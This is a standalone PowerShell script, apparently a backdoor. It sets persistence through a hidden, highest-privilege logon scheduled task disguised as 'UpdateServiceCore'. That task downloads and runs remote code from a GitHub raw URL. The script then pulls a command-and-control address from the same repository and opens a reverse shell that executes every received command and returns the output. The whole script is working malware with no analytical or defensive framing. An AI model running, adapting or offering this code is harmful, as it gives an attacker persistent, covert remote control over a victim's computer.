$currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name

$action = New-ScheduledTaskAction -Execute "PowerShell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -c iex (iwr 'https://raw.githubusercontent.com/X3D4L/pastebin/refs/heads/main/code' -UseBasicP)"
$trigger = New-ScheduledTaskTrigger -AtLogOn
$principal = New-ScheduledTaskPrincipal -UserId $currentUser -LogonType Interactive -RunLevel Highest
$settings = New-ScheduledTaskSettingsSet -DontStopIfGoingOnBatteries -StartWhenAvailable -AllowStartIfOnBatteries

Register-ScheduledTask -Action $action -Trigger $trigger -Principal $principal -TaskName "UpdateServiceCore" -Description "Runs script on logon" -Force -Settings $settings
Start-ScheduledTask -TaskName "UpdateServiceCore"

$ConnectionTimeoutSeconds = 15
$ReconnectDelaySeconds = 30
$HeartbeatIntervalSeconds = 60
$CommandLoopSleepMs = 100

$dataURL = "https://raw.githubusercontent.com/X3D4L/pastebin/refs/heads/main/.dat/"

Write-Host "[*] Fetching C2 configuration from $dataURL"
$var1 = (Invoke-WebRequest -Uri ($dataURL + "ip") -UseBasicParsing | Select-Object -ExpandProperty Content).Trim()
$var2 = (Invoke-WebRequest -Uri ($dataURL + "port") -UseBasicParsing | Select-Object -ExpandProperty Content).Trim()
Write-Host "[+] C2 IP: $var1, Port: $var2"

function Connect-Client {
    param($ip, $port)
    Write-Host "[*] Attempting to connect to $ip`:$port"
    try {
        $client = New-Object System.Net.Sockets.TcpClient
        $connectTask = $client.ConnectAsync($ip, $port)
        $timeoutMs = $ConnectionTimeoutSeconds * 1000
        if ($connectTask.Wait($timeoutMs) -and $client.Connected) {
            Write-Host "[+] Successfully connected to $ip`:$port"
            return $client
        } else {
            Write-Host "[-] Connection timed out after $ConnectionTimeoutSeconds seconds"
        }
    } catch {
        Write-Host "[-] Connection failed: $($_.Exception.Message)"
    }
    return $null
}

function Test-ConnectionAlive {
    param($client)
    if (-not $client -or -not $client.Connected) { return $false }
    
    try {
        $socket = $client.Client
        if ($socket -eq $null) { return $false }
        return $socket.Connected -and -not ($socket.Poll(1000, [System.Net.Sockets.SelectMode]::SelectRead) -and $socket.Available -eq 0)
    } catch {
        return $false
    }
}
while ($true) {
    $client = Connect-Client $var1 $var2
    if ($client) {
        try {
            $stream = $client.GetStream()
            [byte[]]$bytes = 0..65535 | ForEach-Object {0}
            
            Write-Host "[*] Sending initial heartbeat"
            $heartbeatBytes = ([System.Text.Encoding]::ASCII).GetBytes("`nALIVE`n")
            $stream.Write($heartbeatBytes, 0, $heartbeatBytes.Length)
            $stream.Flush()
            
            Write-Host "[*] Entering command loop"
            $lastHeartbeat = [DateTime]::Now
            $connected = $true
            
            while ($connected) {
                if (-not (Test-ConnectionAlive $client)) {
                    Write-Host "[-] Connection lost - remote host disconnected"
                    $connected = $false
                    break
                }
                if ($stream.DataAvailable) {
                    $bytesRead = $stream.Read($bytes, 0, $bytes.Length)
                    if ($bytesRead -eq 0) {
                        Write-Host "[-] Remote host closed connection"
                        $connected = $false
                        break
                    }
                    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $bytesRead)
                    $trimmedData = $data.Trim()
                    
                    if ($trimmedData -ne "") {
                        Write-Host "[*] Received command: $trimmedData"
                        try {
                            $sendback = (iex $trimmedData 2>&1 | Out-String)
                            Write-Host "[*] Command executed, sending response"
                        } catch {
                            $sendback = "Error: $($_.Exception.Message)`n"
                            Write-Host "[-] Command failed: $($_.Exception.Message)"
                        }
                        $sendback2 = $sendback + 'PS ' + (Get-Location).Path + '> '
                        $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
                        $stream.Write($sendbyte, 0, $sendbyte.Length)
                        $stream.Flush()
                    } else {
                        Write-Host "[*] Received empty command (Ignored)"
                        $prompt = 'PS ' + (Get-Location).Path + '> '
                        $promptBytes = ([text.encoding]::ASCII).GetBytes($prompt)
                        $stream.Write($promptBytes, 0, $promptBytes.Length)
                        $stream.Flush()
                    }
                }
                if ([DateTime]::Now.Subtract($lastHeartbeat).TotalSeconds -ge $HeartbeatIntervalSeconds) {
                    Write-Host "[*] Sending heartbeat (ALIVE)"
                    try {
                        $heartbeatBytes = ([System.Text.Encoding]::ASCII).GetBytes("`nALIVE")
                        $stream.Write($heartbeatBytes, 0, $heartbeatBytes.Length)
                        $stream.Flush()
                        $lastHeartbeat = [DateTime]::Now
                    } catch {
                        Write-Host "[-] Heartbeat failed, connection lost"
                        $connected = $false
                        break
                    }
                }
                
                Start-Sleep -Milliseconds $CommandLoopSleepMs
            }
            Write-Host "[*] Exiting command loop"
        } catch {
            Write-Host "[-] Connection error: $($_.Exception.Message)"
        } finally {
            if ($client) { 
                Write-Host "[*] Closing connection"
                $client.Close()
                $client.Dispose()
            }
        }
    }
    
    Write-Host "[*] Waiting $ReconnectDelaySeconds seconds before next connection attempt"
    Start-Sleep -Seconds $ReconnectDelaySeconds
}
